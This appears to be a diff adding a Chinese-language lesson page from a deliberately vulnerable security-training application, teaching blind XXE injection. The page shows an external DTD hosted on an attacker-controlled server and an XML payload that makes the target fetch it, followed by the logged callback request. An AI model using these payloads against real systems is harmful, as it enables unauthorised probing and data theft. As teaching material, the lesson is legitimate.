@@ -1,0 +1,51 @@
+== 盲注 XXE
+
+有时你看不到任何输出，原因可能是攻击成功了，但页面输出中没有反映该字段；也可能是你尝试读取的资源包含非法 XML 字符，导致解析器失败。
+先来看一个示例：这里我们引用一个由自己服务器控制的外部 DTD。
+
+作为攻击者，你控制着 WebWolf（*也可以是你控制的任何服务器*），例如可以使用 `webWolfRootLink:landing[noLink]` 让服务器向它发起请求。
+
+如何利用此端点验证是否能执行 XXE？
+
+我们仍可使用 WebWolf 托管名为 `attack.dtd` 的文件，并写入以下内容：
+
+[source, subs="macros, specialcharacters"]
+----
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY ping SYSTEM 'webWolfRootLink:landing[noLink, target=landing]'>
+----
+
+现在提交表单，将 XML 修改为：
+
+[source, subs="macros, specialcharacters"]
+----
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "webWolfLink:[webWolfLink]">
+%remote;
+]>
+<comment>
+  <text>test&ping;</text>
+</comment>
+----
+
+现在在 WebWolf 中打开“Incoming requests（收到的请求）”，你会看到：
+
+[source]
+----
+{
+  "method" : "GET",
+  "path" : "/landing",
+  "headers" : {
+    "request" : {
+      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
+    },
+  },
+  "parameters" : {
+    "test" : [ "HelloWorld" ],
+  },
+  "timeTaken" : "1"
+}
+----
+
+因此，使用 XXE 我们能够 ping 自己的服务器，这意味着可以执行 XXE 注入。也就是说，XXE 注入基本上可以实现与最开始使用 curl 命令相同的效果。
